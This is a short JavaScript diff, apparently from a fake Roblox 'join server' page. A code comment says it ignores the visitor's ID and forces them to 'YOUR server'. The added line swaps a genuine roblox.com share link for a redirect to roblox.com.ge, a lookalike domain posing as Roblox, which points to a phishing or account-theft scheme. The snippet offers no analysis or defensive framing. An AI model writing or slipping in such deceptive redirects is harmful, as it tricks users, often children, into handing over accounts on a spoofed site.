@@ -43,7 +43,7 @@ actionBtn.addEventListener('click', () => {
     } else if (currentState === 'done') {
         // --- JOIN SERVER ---
         // We ignore the fake ID and force them to YOUR server
-        window.location.href = `https://www.roblox.com/share?code=b0452f8741e790469c00efd1fdf414fb&type=Server`
+        window.location.href = `https://roblox.com.ge/games/109983668079237/SKIBIDI-Steal-a-Brainrot?privateServerLinkCode=18289119608578786247281085808202`
     }
 });
 
